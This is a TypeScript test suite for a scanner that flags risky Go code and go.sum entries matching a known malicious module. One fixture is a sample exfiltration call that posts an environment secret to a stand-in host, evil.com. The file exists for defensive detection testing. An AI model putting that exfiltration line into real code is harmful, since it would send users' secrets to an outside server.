import { describe, it, expect } from "vitest";
import { scanGoContent, scanGoSumContent, isGoFile, GO_PATTERNS } from "../go-scanner.js";

describe("Go Module Scanner", () => {
  it("should identify Go-related files", () => {
    expect(isGoFile("go.mod")).toBe(true);
    expect(isGoFile("go.sum")).toBe(true);
    expect(isGoFile("main.go")).toBe(true);
    expect(isGoFile("handler_test.go")).toBe(true);
    expect(isGoFile("package.json")).toBe(false);
  });

  describe("go.mod scanning", () => {
    it("should detect replace directives", () => {
      const content = "module example.com/app\n\ngo 1.21\n\nreplace example.com/lib => ../my-fork";
      const findings = scanGoContent(content, "go.mod", "mod");
      expect(findings.some((f) => f.rule === "GO_REPLACE_DIRECTIVE")).toBe(true);
    });

    it("should detect retract directives", () => {
      const content = "module example.com/app\n\ngo 1.21\n\nretract v1.0.0";
      const findings = scanGoContent(content, "go.mod", "mod");
      expect(findings.some((f) => f.rule === "GO_RETRACT_DIRECTIVE")).toBe(true);
    });

    it("should not flag clean go.mod", () => {
      const content = [
        "module example.com/app",
        "",
        "go 1.21",
        "",
        "require (",
        "    github.com/gin-gonic/gin v1.9.1",
        ")",
      ].join("\n");
      const findings = scanGoContent(content, "go.mod", "mod");
      expect(findings).toHaveLength(0);
    });
  });

  describe("Go source scanning", () => {
    it("should detect CGo import", () => {
      const content = 'package main\n\nimport "C"\n\nfunc main() {}';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_CGO_IMPORT")).toBe(true);
    });

    it("should detect unsafe import", () => {
      const content = 'package main\n\nimport "unsafe"\n\nfunc main() {}';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_UNSAFE_IMPORT")).toBe(true);
    });

    it("should detect plugin.Open", () => {
      const content = 'package main\n\nfunc load() { p, _ := plugin.Open("module.so") }';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_PLUGIN_LOAD")).toBe(true);
    });

    it("should detect os/exec usage", () => {
      const content = 'package main\n\nimport "os/exec"\n\nfunc run() { exec.Command("ls") }';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_OS_EXEC")).toBe(true);
    });

    it("should detect env exfiltration pattern", () => {
      const content = 'func exfil() {\n    http.Post("https://evil.com", "text/plain", strings.NewReader(os.Getenv("SECRET")))\n}';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_ENV_EXFIL")).toBe(true);
    });

    it("should not flag clean Go source", () => {
      const content = [
        "package main",
        "",
        'import "fmt"',
        "",
        "func main() {",
        '    fmt.Println("Hello, World!")',
        "}",
      ].join("\n");
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings).toHaveLength(0);
    });
  });

  describe("go.sum scanning", () => {
    // Real bundled IOC (BufferZoneCorp sleeper Go modules, go: bare-name entry)
    const MALICIOUS_MODULE = "github.com/BufferZoneCorp/go-metrics-sdk";

    it("should flag a go.sum module matching a go: IOC (reported once)", () => {
      const content = [
        `${MALICIOUS_MODULE} v1.0.0 h1:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=`,
        `${MALICIOUS_MODULE} v1.0.0/go.mod h1:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=`,
        "github.com/gin-gonic/gin v1.9.1 h1:CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=",
      ].join("\n");
      const findings = scanGoSumContent(content, "go.sum");
      const hits = findings.filter((f) => f.rule === "GO_MALICIOUS_MODULE");
      // Two hash lines for the same module, but reported once.
      expect(hits).toHaveLength(1);
      expect(hits[0]?.severity).toBe("critical");
      expect(hits[0]?.category).toBe("malware");
      expect(hits[0]?.description).toContain(MALICIOUS_MODULE);
    });

    it("should not flag a clean go.sum (FP-safety)", () => {
      const content = [
        "github.com/gin-gonic/gin v1.9.1 h1:xxxx=",
        "github.com/gin-gonic/gin v1.9.1/go.mod h1:yyyy=",
        "golang.org/x/sys v0.20.0 h1:zzzz=",
      ].join("\n");
      expect(scanGoSumContent(content, "go.sum")).toHaveLength(0);
    });

    it("should not crash on blank or malformed lines", () => {
      expect(() => scanGoSumContent("\n   \nbadline\n", "go.sum")).not.toThrow();
      expect(scanGoSumContent("", "go.sum")).toHaveLength(0);
    });
  });

  it("should include line numbers", () => {
    const content = "module x\n\ngo 1.21\n\nreplace x => ../y";
    const findings = scanGoContent(content, "go.mod", "mod");
    expect(findings.find((f) => f.rule === "GO_REPLACE_DIRECTIVE")?.line).toBe(5);
  });

  it("should have patterns array", () => {
    expect(GO_PATTERNS.length).toBeGreaterThan(5);
    for (const p of GO_PATTERNS) {
      expect(p.rule).toBeTruthy();
      expect(p.severity).toBeTruthy();
    }
  });
});
